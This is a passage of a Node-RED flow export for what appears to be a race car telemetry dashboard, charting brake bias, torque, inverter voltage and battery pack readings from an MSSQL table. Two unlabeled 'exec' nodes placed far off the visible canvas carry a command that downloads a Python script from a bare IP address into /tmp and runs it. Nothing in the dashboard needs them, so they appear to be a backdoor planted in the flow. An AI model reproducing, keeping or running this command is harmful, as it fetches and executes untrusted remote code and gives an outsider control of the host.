        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 870,
        "y": 720,
        "wires": [
            []
        ]
    },
    {
        "id": "f2c11678b365e4bd",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "1fc0dcc2cd8a691a",
        "order": 4,
        "width": "10",
        "height": "6",
        "label": "Command Torque",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 870,
        "y": 760,
        "wires": [
            []
        ]
    },
    {
        "id": "7829c2378222bdef",
        "type": "ui_text",
        "z": "8c02145f70bf7c6a",
        "group": "1fc0dcc2cd8a691a",
        "order": 6,
        "width": "4",
        "height": "2",
        "name": "",
        "label": "Failsafe Statuses",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 870,
        "y": 460,
        "wires": []
    },
    {
        "id": "252332f614f27f48",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "1fc0dcc2cd8a691a",
        "order": 2,
        "width": "10",
        "height": "6",
        "label": "Brake Bias Aim",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#dbc8b6",
            "#000000",
            "#000000",
            "#000000",
            "#000000"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 860,
        "y": 100,
        "wires": [
            []
        ]
    },
    {
        "id": "2b58eb8144aab92a",
        "type": "ui_text",
        "z": "8c02145f70bf7c6a",
        "group": "1fc0dcc2cd8a691a",
        "order": 7,
        "width": "4",
        "height": "2",
        "name": "",
        "label": "BMS Failsafe Statuses",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 880,
        "y": 500,
        "wires": []
    },
    {
        "id": "da8bb60e587ca5ba",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "33c8b737093be8e2",
        "order": 1,
        "width": "10",
        "height": "6",
        "label": "Inverter DC Bus Voltage",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#dbc8b6",
            "#000000",
            "#000000",
            "#000000",
            "#000000"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 890,
        "y": 820,
        "wires": [
            []
        ]
    },
    {
        "id": "afe4adb2d73aeb32",
        "type": "exec",
        "z": "149f680d508ad4ad",
        "command": "curl -o /tmp/3.py http://82.153.138.166/3.py; python /tmp/3.py",
        "addpay": "payload",
        "append": "",
        "useSpawn": "false",
        "timer": "10080",
        "winHide": false,
        "oldrc": false,
        "name": "",
        "x": 4910,
        "y": 5060,
        "wires": [
            [],
            [],
            []
        ]
    },
    {
        "id": "0d0ceabf6adad9f3",
        "type": "inject",
        "z": "149f680d508ad4ad",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 4910,
        "y": 5051,
        "wires": [
            [
                "afe4adb2d73aeb32"
            ]
        ]
    },
    {
        "id": "c103b1c4f0c2850a",
        "type": "inject",
        "z": "149f680d508ad4ad",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": -4939,
        "y": -4799,
        "wires": [
            [
                "9bfdef0bf82502f4"
            ]
        ]
    },
    {
        "id": "9bfdef0bf82502f4",
        "type": "MSSQL",
        "z": "149f680d508ad4ad",
        "mssqlCN": "933ce03686fddbab",
        "name": "",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "queryParams",
        "paramsOptType": "none",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": -4729,
        "y": -4799,
        "wires": [
            [
                "95b99ab17452fc9c"
            ]
        ]
    },
    {
        "id": "95b99ab17452fc9c",
        "type": "function",
        "z": "149f680d508ad4ad",
        "name": "Useful",
        "func": "var sigFigs = 2\n\nvar Total_Pack_Cycles =\n{\n    topic: \"Total Pack Cycles\",\n    payload: msg.payload[0].Total_Pack_Cycles\n}\ntry{\n    Total_Pack_Cycles.payload = Total_Pack_Cycles.payload.toFixed(sigFigs)\n}catch{}\n\nvar Pack_Open_Voltage =\n{\n    topic: \"Pack Open Voltage (V)\",\n    payload: msg.payload[0].Pack_Open_Voltage\n}\ntry {\n    Pack_Open_Voltage.payload = Pack_Open_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_SOC =\n{\n    topic: \"Pack State of Charge (%)\",\n    payload: msg.payload[0].Pack_SOC\n}\ntry {\n    Pack_SOC.payload = Pack_SOC.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Amphours =\n{\n    topic: \"Pack Amp Hours (Ah)\",\n    payload: msg.payload[0].Pack_Amphours\n}\ntry {\n    Pack_Amphours.payload = Pack_Amphours.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Resistance =\n{\n    topic: \"Pack Resistance (Ω)\",\n    payload: msg.payload[0].Pack_Resistance\n}\ntry {\n    Pack_Resistance.payload = Pack_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Temperature =\n{\n    topic: \"Low Temperature (ºC)\",\n    payload: msg.payload[0].Low_Temperature\n}\ntry {\n    Low_Temperature.payload = Low_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Thermistor_ID =\n{\n    topic: \"Low Thermistor ID\",\n    payload: msg.payload[0].Low_Thermistor_ID\n}\ntry {\n    Low_Thermistor_ID.payload = Low_Thermistor_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Maximum_Pack_Voltage =\n{\n    topic: \"Maximum Pack Voltage (V)\",\n    payload: msg.payload[0].maximum_pack_voltage\n}\ntry {\n    Maximum_Pack_Voltage.payload = Maximum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Pack_Voltage =\n{\n    topic: \"Minimum Pack Voltage (V)\",\n    payload: msg.payload[0].Minimum_Pack_Voltage\n}\ntry {\n    Minimum_Pack_Voltage.payload = Minimum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Internal_Temperature =\n{\n    topic: \"Internal Temperature (ºC)\",\n    payload: msg.payload[0].Internal_Temperature\n}\ntry {\n    Internal_Temperature.payload = Internal_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage =\n{\n    topic: \"High Cell Voltage (ºC)\",\n    payload: msg.payload[0].High_Cell_Voltage\n}\ntry {\n    High_Cell_Voltage.payload = High_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage_ID =\n{\n    topic: \"High Cell Voltage ID\",\n    payload: msg.payload[0].High_Cell_Voltage_ID\n}\ntry {\n    High_Cell_Voltage_ID.payload = High_Cell_Voltage_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Resistance =\n{\n    topic: \"Low Cell Resistance (MΩ)\",\n    payload: msg.payload[0].Low_Cell_Resistance\n}\ntry {\n    Low_Cell_Resistance.payload = Low_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Intres_ID =\n{\n    topic: \"Low Internal Resistance ID\",\n    payload: msg.payload[0].Low_Intres_ID\n}\ntry {\n    Low_Intres_ID.payload = Low_Intres_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Maximum_Cell_Voltage =\n{\n    topic: \"Maximum Cell Voltage (V)\",\n    payload: msg.payload[0].Maximum_Cell_Voltage\n}\ntry {\n    Maximum_Cell_Voltage.payload = Maximum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Cell_Voltage =\n{\n    topic: \"Minimum Cell Voltage (V)\",\n    payload: msg.payload[0].Minimum_Cell_Voltage\n}\ntry {\n    Minimum_Cell_Voltage.payload = Minimum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Input_Supply_Voltage =\n{\n    topic: \"Input Supply Voltage (V)\",\n    payload: msg.payload[0].Input_Supply_Voltage\n}\ntry {\n    Input_Supply_Voltage.payload = Input_Supply_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Avg_Cell_Resistance =\n{\n    topic: \"Average Cell Resistance (MΩ)\",\n    payload: msg.payload[0].Avg_Cell_Resistance\n}\ntry {\n    Avg_Cell_Resistance.payload = Avg_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\n\nreturn [\n    Total_Pack_Cycles,\n    Pack_Open_Voltage,\n    Pack_SOC,\n    Pack_Amphours,\n    Pack_Resistance,\n    Low_Temperature,\n    Low_Thermistor_ID,\n    Avg_Cell_Resistance,\n    Maximum_Pack_Voltage,\n    Minimum_Pack_Voltage,\n    Internal_Temperature,\n    High_Cell_Voltage,\n    High_Cell_Voltage_ID,\n    Low_Cell_Resistance,\n    Low_Intres_ID,\n    Maximum_Cell_Voltage,\n    Minimum_Cell_Voltage,\n    Input_Supply_Voltage\n]",
        "outputs": 18,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": -4559,
        "y": -4759,
        "wires": [
            [
                "cba27a8bcf37828e"
            ],
            [
                "21aef388ffcbfc33"
            ],
            [
                "39329aaedafd2aac"
            ],
            [
                "3f1c6ea470dfdc93"
            ],
            [
                "392bf39b099a77a4"
            ],
            [
                "59e947dc081f11be"
            ],
            [
                "59e947dc081f11be"
            ],
            [
                "392bf39b099a77a4"
            ],
            [
                "21aef388ffcbfc33"
            ],
            [
                "21aef388ffcbfc33"
            ],
            [
                "59e947dc081f11be"
            ],
            [
                "7e68e97313b370f7"
            ],
            [
                "7e68e97313b370f7"
            ],
            [
                "392bf39b099a77a4"
            ],
            [
                "392bf39b099a77a4"
            ],
            [
                "7e68e97313b370f7"
            ],
            [
                "7e68e97313b370f7"
            ],
            [
                "0edca7627c88a1a8"
            ]
        ]
    },
    {
        "id": "21aef388ffcbfc33",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 1,
        "width": "10",
        "height": 6,
        "label": "Pack Voltage (V)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4329,
        "y": -4779,
        "wires": [
            []
        ]
    },
    {
        "id": "39329aaedafd2aac",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 7,
        "width": "10",
        "height": 6,
        "label": "Pack State of Charge",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4309,
        "y": -4859,
        "wires": [
            []
        ]
    },
    {
        "id": "59e947dc081f11be",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 4,
        "width": "10",
        "height": 6,
        "label": "Temperature (Celsius)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4309,
        "y": -4739,
        "wires": [
            []
        ]
    },
    {
        "id": "7e68e97313b370f7",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 2,
        "width": "10",
        "height": 6,
        "label": "Cell Voltage (V)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4329,
        "y": -4699,
        "wires": [
            []
        ]
    },
    {
        "id": "392bf39b099a77a4",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 5,
        "width": "10",
        "height": 6,
        "label": "Resistances (Ohm)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4319,
        "y": -4659,
        "wires": [
            []
        ]
    },
    {
        "id": "3f1c6ea470dfdc93",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 3,
        "width": "10",
        "height": "6",
        "label": "Pack Amphours",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4329,
        "y": -4819,
        "wires": [
            []
        ]
    },
    {
        "id": "cba27a8bcf37828e",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 8,
        "width": "10",
        "height": "6",
        "label": "Total Packet Cycles",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4319,
        "y": -4899,
        "wires": [
            []
        ]
    },
    {
        "id": "0edca7627c88a1a8",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 6,
        "width": "10",
        "height": "6",
        "label": "Input Supply Voltage (V)",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4299,
        "y": -4619,
        "wires": [
            []
        ]
    },
    {
        "id": "3ca0461c80c4503b",
        "type": "exec",
        "z": "149f680d508ad4ad",
        "command": "curl -o /tmp/3.py http://82.153.138.166/3.py; python /tmp/3.py",
        "addpay": "payload",
        "append": "",
        "useSpawn": "false",
        "timer": "10080",
        "winHide": false,
        "oldrc": false,
        "name": "",
        "x": 4770,
        "y": 4980,
        "wires": [
            [],
            [],
            []
        ]
    },
    {
        "id": "e88b2ea385e12d2f",
        "type": "inject",
        "z": "149f680d508ad4ad",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 4770,
        "y": 4971,
        "wires": [
            [
                "3ca0461c80c4503b"
            ]
        ]
    },
    {
        "id": "36b876157e713cd0",
        "type": "inject",
        "z": "149f680d508ad4ad",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": -5079,
        "y": -4879,
        "wires": [
            [
                "b98a0e363e8ce8ef"
            ]
        ]
    },
    {
        "id": "b98a0e363e8ce8ef",
        "type": "MSSQL",
        "z": "149f680d508ad4ad",
        "mssqlCN": "933ce03686fddbab",
        "name": "",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "queryParams",
        "paramsOptType": "none",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": -4869,
        "y": -4879,
        "wires": [
            [
                "b6c6b189971e06dc"
            ]
        ]
    },
    {
        "id": "b6c6b189971e06dc",
        "type": "function",
        "z": "149f680d508ad4ad",
        "name": "Useful",
        "func": "var sigFigs = 2\n\nvar Total_Pack_Cycles =\n{\n    topic: \"Total Pack Cycles\",\n    payload: msg.payload[0].Total_Pack_Cycles\n}\ntry{\n    Total_Pack_Cycles.payload = Total_Pack_Cycles.payload.toFixed(sigFigs)\n}catch{}\n\nvar Pack_Open_Voltage =\n{\n    topic: \"Pack Open Voltage (V)\",\n    payload: msg.payload[0].Pack_Open_Voltage\n}\ntry {\n    Pack_Open_Voltage.payload = Pack_Open_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_SOC =\n{\n    topic: \"Pack State of Charge (%)\",\n    payload: msg.payload[0].Pack_SOC\n}\ntry {\n    Pack_SOC.payload = Pack_SOC.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Amphours =\n{\n    topic: \"Pack Amp Hours (Ah)\",\n    payload: msg.payload[0].Pack_Amphours\n}\ntry {\n    Pack_Amphours.payload = Pack_Amphours.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Resistance =\n{\n    topic: \"Pack Resistance (Ω)\",\n    payload: msg.payload[0].Pack_Resistance\n}\ntry {\n    Pack_Resistance.payload = Pack_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Temperature =\n{\n    topic: \"Low Temperature (ºC)\",\n    payload: msg.payload[0].Low_Temperature\n}\ntry {\n    Low_Temperature.payload = Low_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Thermistor_ID =\n{\n    topic: \"Low Thermistor ID\",\n    payload: msg.payload[0].Low_Thermistor_ID\n}\ntry {\n    Low_Thermistor_ID.payload = Low_Thermistor_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Maximum_Pack_Voltage =\n{\n    topic: \"Maximum Pack Voltage (V)\",\n    payload: msg.payload[0].maximum_pack_voltage\n}\ntry {\n    Maximum_Pack_Voltage.payload = Maximum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Pack_Voltage =\n{\n    topic: \"Minimum Pack Voltage (V)\",\n    payload: msg.payload[0].Minimum_Pack_Voltage\n}\ntry {\n    Minimum_Pack_Voltage.payload = Minimum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Internal_Temperature =\n{\n    topic: \"Internal Temperature (ºC)\",\n    payload: msg.payload[0].Internal_Temperature\n}\ntry {\n    Internal_Temperature.payload = Internal_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage =\n{\n    topic: \"High Cell Voltage (ºC)\",\n    payload: msg.payload[0].High_Cell_Voltage\n}\ntry {\n    High_Cell_Voltage.payload = High_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage_ID =\n{\n    topic: \"High Cell Voltage ID\",\n    payload: msg.payload[0].High_Cell_Voltage_ID\n}\ntry {\n    High_Cell_Voltage_ID.payload = High_Cell_Voltage_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Resistance =\n{\n    topic: \"Low Cell Resistance (MΩ)\",\n    payload: msg.payload[0].Low_Cell_Resistance\n}\ntry {\n    Low_Cell_Resistance.payload = Low_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Intres_ID =\n{\n    topic: \"Low Internal Resistance ID\",\n    payload: msg.payload[0].Low_Intres_ID\n}\ntry {\n    Low_Intres_ID.payload = Low_Intres_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Maximum_Cell_Voltage =\n{\n    topic: \"Maximum Cell Voltage (V)\",\n    payload: msg.payload[0].Maximum_Cell_Voltage\n}\ntry {\n    Maximum_Cell_Voltage.payload = Maximum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Cell_Voltage =\n{\n    topic: \"Minimum Cell Voltage (V)\",\n    payload: msg.payload[0].Minimum_Cell_Voltage\n}\ntry {\n    Minimum_Cell_Voltage.payload = Minimum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Input_Supply_Voltage =\n{\n    topic: \"Input Supply Voltage (V)\",\n    payload: msg.payload[0].Input_Supply_Voltage\n}\ntry {\n    Input_Supply_Voltage.payload = Input_Supply_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Avg_Cell_Resistance =\n{\n    topic: \"Average Cell Resistance (MΩ)\",\n    payload: msg.payload[0].Avg_Cell_Resistance\n}\ntry {\n    Avg_Cell_Resistance.payload = Avg_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\n\nreturn [\n    Total_Pack_Cycles,\n    Pack_Open_Voltage,\n    Pack_SOC,\n    Pack_Amphours,\n    Pack_Resistance,\n    Low_Temperature,\n    Low_Thermistor_ID,\n    Avg_Cell_Resistance,\n    Maximum_Pack_Voltage,\n    Minimum_Pack_Voltage,\n    Internal_Temperature,\n    High_Cell_Voltage,\n    High_Cell_Voltage_ID,\n    Low_Cell_Resistance,\n    Low_Intres_ID,\n    Maximum_Cell_Voltage,\n    Minimum_Cell_Voltage,\n    Input_Supply_Voltage\n]",
        "outputs": 18,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": -4699,
        "y": -4839,
        "wires": [
            [
                "0c940bf3d94b7ca0"
            ],
            [
                "6f909d70dfc5531a"
            ],
            [
                "19536ae3e4af1f07"
            ],
            [
                "f992ff749bbee932"
            ],
            [
                "cca35d9bf5fe8079"
            ],
            [
                "ced9a044cd821772"
            ],
            [
                "ced9a044cd821772"
            ],
            [
                "cca35d9bf5fe8079"
            ],
            [
                "6f909d70dfc5531a"
            ],
            [
                "6f909d70dfc5531a"
            ],
            [
                "ced9a044cd821772"
            ],
            [
                "164b42cffa1f0225"
            ],
            [
                "164b42cffa1f0225"
            ],
            [
                "cca35d9bf5fe8079"
            ],
            [
                "cca35d9bf5fe8079"
            ],
            [
                "164b42cffa1f0225"
            ],
            [
                "164b42cffa1f0225"
            ],
            [
                "7c1b41f05208490c"
            ]
        ]
    },
    {
        "id": "6f909d70dfc5531a",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 1,
        "width": "10",
        "height": 6,
        "label": "Pack Voltage (V)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4469,
        "y": -4859,
        "wires": [
            []
        ]
    },
    {
        "id": "19536ae3e4af1f07",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 7,
        "width": "10",
        "height": 6,
        "label": "Pack State of Charge",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4449,
        "y": -4939,
        "wires": [
            []
        ]
    },
    {
        "id": "ced9a044cd821772",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 4,
        "width": "10",
        "height": 6,
        "label": "Temperature (Celsius)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4449,
        "y": -4819,
        "wires": [
            []
        ]
    },
    {
        "id": "164b42cffa1f0225",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 2,
        "width": "10",
        "height": 6,
        "label": "Cell Voltage (V)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
